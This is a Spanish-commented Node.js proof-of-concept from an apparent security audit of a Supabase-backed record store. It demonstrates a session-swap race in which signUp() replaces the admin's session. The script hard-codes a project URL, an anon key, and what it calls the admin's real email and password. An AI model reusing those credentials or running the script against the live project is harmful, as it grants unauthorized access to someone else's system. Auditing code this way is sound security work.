/**
 * PoC — VUL-01: Race Condition / Session Swap
 * Proyecto: VynilStore (Groovehaus)
 * Auditor: Manuel
 * 
 * OBJETIVO: Demostrar que durante handleCreateUser(), existe una ventana
 * de tiempo donde el cliente Supabase opera con la sesión del usuario
 * recién creado, no con la del admin.
 * 
 * PREREQUISITOS:
 *   - Tener credenciales de admin válidas
 *   - npm install @supabase/supabase-js
 * 
 * USO:
 *   node poc_vul01_session_swap.js
 */

import { createClient } from '@supabase/supabase-js'

const SUPABASE_URL    = 'https://ybcxzntioiohbmyhwiee.supabase.co'
const SUPABASE_ANON   = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InliY3h6bnRpb2lvaGJteWh3aWVlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNDI2MTksImV4cCI6MjA5NDgxODYxOX0.slRr5A5K804uag2N-1g6u9jz2Vaq2FXB1mRoxQXE37k'

// Credenciales reales del admin para la prueba
const ADMIN_EMAIL    = 'manuelpro@ucol.mx'
const ADMIN_PASSWORD = 'manuelricolino'

// Usuario víctima a crear
const VICTIM_EMAIL   = `victim_poc_${Date.now()}@test-audit.com`
const VICTIM_PASSWORD = 'VictimPass123!'

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON)

async function runPoC() {
  console.log('='.repeat(60))
  console.log('PoC VUL-01 — Race Condition / Session Swap')
  console.log('='.repeat(60))

  // PASO 1: Login como admin
  console.log('\n[1] Iniciando sesión como admin...')
  const { data: loginData, error: loginErr } = await supabase.auth.signInWithPassword({
    email: ADMIN_EMAIL,
    password: ADMIN_PASSWORD
  })
  if (loginErr) { console.error('❌ Login fallido:', loginErr.message); process.exit(1) }
  
  const adminUserId = loginData.user.id
  console.log(`✅ Admin autenticado. ID: ${adminUserId}`)
  console.log(`   Email: ${loginData.user.email}`)

  // PASO 2: Verificar sesión actual (debe ser la del admin)
  const { data: { session: beforeSession } } = await supabase.auth.getSession()
  console.log(`\n[2] Sesión ANTES de signUp():`)
  console.log(`   user_id : ${beforeSession.user.id}`)
  console.log(`   email   : ${beforeSession.user.email}`)
  console.log(`   role    : ${beforeSession.user.role}`)

  // PASO 3: Guardar sesión del admin (igual que el código real de Admin.jsx)
  const adminSession = beforeSession

  // PASO 4: Ejecutar signUp() del nuevo usuario (INICIO DE LA VENTANA VULNERABLE)
  console.log(`\n[3] Ejecutando signUp() del nuevo usuario: ${VICTIM_EMAIL}`)
  const { data: signUpData, error: signUpErr } = await supabase.auth.signUp({
    email: VICTIM_EMAIL,
    password: VICTIM_PASSWORD,
    options: { data: { full_name: 'Usuario PoC Audit' } }
  })

  // PASO 5: Leer sesión INMEDIATAMENTE después del signUp (antes del setSession)
  // AQUÍ está la ventana vulnerable — esto es lo que ejecuta el código real
  // entre signUp() y setSession()
  const { data: { session: duringSession } } = await supabase.auth.getSession()
  
  console.log(`\n[4] ⚠️  Sesión DURANTE la ventana vulnerable (post-signUp, pre-setSession):`)
  if (duringSession) {
    console.log(`   user_id  : ${duringSession.user.id}`)
    console.log(`   email    : ${duringSession.user.email}`)
    const sessionChanged = duringSession.user.id !== adminUserId
    console.log(`   ¿Sesión cambiada?: ${sessionChanged ? '🔴 SÍ — VULNERABILIDAD CONFIRMADA' : '✅ No cambió'}`)
    
    if (sessionChanged) {
      console.log('\n   🚨 IMPACT: En este momento, cualquier operación Supabase')
      console.log('      se ejecutaría como el USUARIO NUEVO, no como admin.')
      console.log('      Ejemplo: DELETE en vinyls fallaría (usuario sin permisos).')
      console.log('      Si hubiera una tabla sin RLS, operaría con sesión incorrecta.')
    }
  } else {
    console.log('   ⚠️  No hay sesión activa (usuario no auto-confirmado, signUp devolvió null session)')
    console.log('   → Esto depende de la configuración "Email confirmations" en Supabase Auth.')
  }

  // PASO 6: Restaurar sesión del admin (igual que el código real)
  console.log('\n[5] Intentando restaurar sesión del admin...')
  const { data: restoredData, error: restoreErr } = await supabase.auth.setSession({
    access_token: adminSession.access_token,
    refresh_token: adminSession.refresh_token
  })

  if (restoreErr) {
    console.log(`❌ setSession() FALLÓ: ${restoreErr.message}`)
    console.log('   🚨 IMPACT CRÍTICO: Admin queda con sesión incorrecta o sin sesión.')
  } else {
    const { data: { session: afterSession } } = await supabase.auth.getSession()
    console.log(`✅ Sesión restaurada: ${afterSession?.user?.email}`)
    const restored = afterSession?.user?.id === adminUserId
    console.log(`   ¿Es la sesión del admin?: ${restored ? '✅ Sí' : '🔴 NO — FALLO DE RESTAURACIÓN'}`)
  }

  // PASO 7: Cleanup
  console.log('\n[6] Cleanup: eliminando usuario de prueba...')
  // No se puede eliminar sin service role key desde el cliente — documentar
  console.log('   ℹ️  Usuario de prueba creado:', VICTIM_EMAIL)
  console.log('   ℹ️  Eliminarlo manualmente en: Supabase Dashboard → Authentication → Users')

  console.log('\n' + '='.repeat(60))
  console.log('RESULTADO: Ver salida arriba para confirmar/descartar VUL-01')
  console.log('='.repeat(60))

  await supabase.auth.signOut()
}

runPoC().catch(console.error)
